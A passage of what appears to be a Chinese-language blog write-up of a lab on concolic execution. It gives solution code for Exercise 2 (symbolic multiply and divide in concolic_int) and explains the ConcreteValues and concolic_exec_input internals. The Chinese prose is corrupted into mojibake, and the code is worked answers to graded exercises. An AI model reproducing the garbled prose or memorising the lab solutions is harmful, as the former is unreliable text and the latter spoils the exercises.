class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼šé€šè¿‡å¢åŠ æ•´å‹ä¹˜æ³•ä¸é™¤æ³•æ”¯æŒæ¥å®Œæˆå¯¹ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_int</code> çš„å®ç°ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½é¢å¤–çš„æ–¹æ³•å¹¶ä¸ºä¹˜é™¤æ³•è¿ç®—æ·»åŠ  AST èŠ‚ç‚¹ï¼Œå¹¶ä¸ºè¿™äº› AST èŠ‚ç‚¹åº”ç”¨ <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>.&#x2F;check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆå®ç°ç¬¦å·å˜é‡ä¹˜é™¤æ‰€éœ€çš„ <code>sym_binop</code> å­ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å‚ç…§å‰é¢çš„åŠ å‡è¿ç®—ç›´æ¥è°ƒç”¨ <code>z3expr()</code> æ¥è¿”å› Z3 è¡¨è¾¾å¼å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶ python çš„é™¤æ³•è¿ç®—æœ‰ <code>/</code> ä¸ <code>//</code>ä¸¤ç§ï¼Œä½†æ˜¯ Z3å¹¶ä¸æ”¯æŒ <code>ArithRef</code> ä¸ <code>int</code> ç›´æ¥è¿›è¡Œ <code>//</code> è¿ç®—ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªå®ç°ä¸€ä¸ªæ™®é€šçš„ä¹˜æ³•å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡å†™ <code>concolic_int</code> çš„ä¹˜æ³•ä¸é™¤æ³•ï¼Œæˆ‘ä»¬å…ˆå‚è€ƒä¸€ä¸‹ <code>concolic_int </code>ä¸­çš„åŠ æ³•è¿ç®—æ–¹å¼ï¼šã€</p><ul><li>é¦–å…ˆåˆ¤æ–­è¿ç®—å¯¹è±¡æ˜¯å¦ä¸º <code>concolic_int</code> ï¼Œè‹¥æ˜¯åˆ™å°†è‡ªèº«å…·ä½“å€¼åŠ ä¸Šå¯¹è±¡å…·ä½“å€¼ï¼Œå¦åˆ™ç›´æ¥åŠ ä¸Šè¯¥å¯¹è±¡ï¼Œç»“æœå­˜æ”¾åˆ° <code>res</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>concolic_int</code> å®ä¾‹ä½œä¸ºè¿”å›å€¼ï¼Œ<code>res</code> ä½œä¸ºå…¶å…·ä½“å€¼éƒ¨åˆ†ï¼Œåˆ›å»ºä¸¤ä¸ª <code>ast</code> å®ä¾‹å¹¶åˆ©ç”¨ <code>sym_plus()</code> è®¡ç®—ç»“æœä½œä¸ºæ–° concolic_int çš„ç¬¦å·å€¼éƒ¨åˆ†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬çš„ä¹˜é™¤æ³•å…¶å®ä¾è‘«èŠ¦ç”»ç“¢å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦åŒæ—¶å®ç° <code>/</code> ä¸ <code>//</code> ä¸¤ç§é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 2ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 3ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬ç†Ÿæ‚‰æ··åˆæ‰§è¡Œç³»ç»Ÿçš„ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæä¾›çš„é€”å¾„æ˜¯ä¿®æ”¹ <code>symex_exercises.py</code> ä»¥ç»™äºˆæµ‹è¯•ç³»ç»Ÿæ­£ç¡®çš„è¾“å…¥ï¼š</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Donâ€™t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ··åˆæ‰§è¡Œæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ä¾¿æ˜¯ <code>symex/fuzzy.py</code>  ä¸­çš„  <code>concolic_exec_input()</code> ï¼Œé¢˜ç›®è¯´åç»­æˆ‘ä»¬å°†ç”¨å…¶å®ç°ä¸€ä¸ªå®Œæ•´çš„æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬å…ˆæ¥çœ‹å…¶ç›¸å…³çš„å…·ä½“å®ç°</p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2</h3><h4 id="VI-å…·ä½“å€¼å­—å…¸-ConcreteValues"><a href="#VI-å…·ä½“å€¼å­—å…¸-ConcreteValues" class="headerlink" title="VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues"></a>VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues</h4><p>å¦‚å‰æ–‡æ‰€è¨€ï¼Œåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å­—å…¸ä¸­ï¼Œå®ä¸ºä¸€ä¸ª<code>ConctreteValues</code> ç±»å¯¹è±¡ï¼Œå®é™…ä¸Šå°±æ˜¯ python å­—å…¸çš„ä¸€ä¸ª wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>symex/fuzzy.py</code> ä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ <code>current_concrete_values</code>ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€è¯´çš„å…¨å±€å…·ä½“å€¼å­—å…¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>ConctreteValues.mk_global()</code> ä½¿è¯¥å¯¹è±¡å˜ä¸ºå…¨å±€å¼•ç”¨ï¼Œå³æˆ‘ä»¬æ¯æ¬¡ä½¿ç”¨åªéœ€è¦åˆ›å»ºä¸€ä¸ª<code>ConctreteValues</code> å¯¹è±¡å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥ç±»ä¸­æœ‰ä¸‰ä¸ªæŸ¥è¯¢å­—å…¸å†… id å¯¹åº”å…·ä½“å€¼å¹¶è¿”å›æ··åˆå€¼çš„å‡½æ•°ï¼Œè‹¥ id ä¸åœ¨å­—å…¸å†…åˆ™è¿›è¡Œæ·»åŠ ï¼ŒåŒæ—¶åœ¨ <code>symex/fuzzy.py</code> ä¸­å¸¦æœ‰ä¸‰ä¸ªå¯¹è¿™äº›å‡½æ•°çš„ wrapperï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„å‡½æ•°ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>add()</code> æˆå‘˜å‡½æ•°æ¥å‘å­—å…¸å†…æ·»åŠ æ˜ å°„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>ä»¥åŠè¿˜æœ‰ä¸€ä¸ª <code>canonical_rep()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥è¿”å›å­—å…¸ä¸­çš„é”®å€¼å¯¹å…ƒç»„æ’åºåˆ—è¡¨ï¼Œä»¥åŠ <code>var_names()</code> ç”¨ä»¥è¿”å› id åˆ—è¡¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ª <code>inherit()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥ä»å¦ä¸€ä¸ªå­—å…¸ä¸­æ‹·è´é”®å€¼å¯¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ"><a href="#VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ" class="headerlink" title="VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ"></a>VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ</h4><p>è¯¥å‡½æ•°å†…å®¹ç”¨ä»¥æ ¹æ®ç»™äºˆçš„å­—å…¸å¯¹ä¼ å…¥çš„å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œæ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>åˆå§‹åŒ–ä¸¤ä¸ªå…¨å±€ç©ºåˆ—è¡¨ <code>cur_path_constr</code> ï¼ˆ<strong>å½“å‰è·¯å¾„çš„æ¡ä»¶çº¦æŸ</strong>ï¼‰ä¸ <code>cur_path_constr_callers</code>ï¼ˆå½“å‰è·¯å¾„çš„ä¿¡æ¯ï¼‰</li><li>è°ƒç”¨ <code>concrete_values.mk_global()</code> ä½¿å…¶æˆä¸ºä¸€ä¸ªå…¨å±€å­—å…¸</li><li>è°ƒç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥è·å¾—ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè‹¥å‚æ•° <code>verbose &gt; 1</code> åˆ™æ‰“å°ä¸¤ä¸ªåˆ—è¡¨çš„å†…å®¹</li><li>æœ€åçš„è¿”å›å€¼ä¸º <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å¹¶æ²¡æœ‰æ›´æ”¹è·¯å¾„çº¦æŸä¸ä¿¡æ¯çš„åˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™åœ¨ <code>add_constr()</code> ä¸­å®Œæˆï¼Œè¯¥å‡½æ•°åœ¨ <code>concolic_bool()</code> ä¸­è°ƒç”¨ï¼Œå°†çº¦æŸä¿¡æ¯è¿›è¡Œæ·»åŠ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è€Œ <code>concolic_bool()</code> å®é™…ä¸Šåœ¨ <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„è¿ç®—ç¬¦é‡è½½ä¸­è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ¯æ¬¡æ‰§è¡Œ <code>concolic_exec_input()</code> éƒ½è¦<strong>é‡æ–°å°†è·¯å¾„çº¦æŸä¸ä¿¡æ¯åˆ—è¡¨æ¸…ç©º</strong>çš„ç¼˜æ•…ï¼Œè¿™é‡Œä»¥ <code>concolic_int </code>ä¸­çš„ <code>__cmp__</code> è¿ç®—ç¬¦ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>symex_exercises.py</code>  é‡Œæœ‰å•¥ï¼Œä¸»è¦å°±ä¸€ä¸ª <code>make_a_test()</code> å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­å®Œæˆå…¨å±€å…·ä½“å€¼å­—å…¸ <code>concrete_values</code> çš„æ„å»ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹   <code>symex_exercises.py</code> 